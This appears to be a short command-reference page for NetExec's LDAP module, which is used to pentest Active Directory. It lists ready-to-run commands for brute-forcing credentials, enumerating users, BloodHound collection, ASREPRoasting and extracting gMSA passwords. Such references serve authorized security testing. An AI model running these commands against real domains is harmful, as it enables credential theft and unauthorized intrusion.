# nxc-ldap

> Pentest and exploit Windows Active Directory Domains via LDAP. More information: <https://www.netexec.wiki/ldap-protocol>.

## Examples

### Search for valid domain credentials by trying out every combination in the specified lists of usernames and passwords

```bash
nxc ldap 192.168.178.2 [-u|--username] path/to/usernames.txt [-p|--password] path/to/passwords.txt
```

### Enumerate active domain users

```bash
nxc ldap 192.168.178.2 [-u|--username] username [-p|--password] password --active-users
```

### Collect data about the targeted domain and automatically import these data into BloodHound

```bash
nxc ldap 192.168.178.2 [-u|--username] username [-p|--password] password --bloodhound [-c|--collection] All
```

### Attempt to collect AS_REP messages for the specified user in order to perform an ASREPRoasting attack

```bash
nxc ldap 192.168.178.2 [-u|--username] username [-p|--password] '' --asreproast path/to/output.txt
```

### Attempt to extract the passwords of group managed service accounts on the domain

```bash
nxc ldap 192.168.178.2 [-u|--username] username [-p|--password] password --gmsa
```
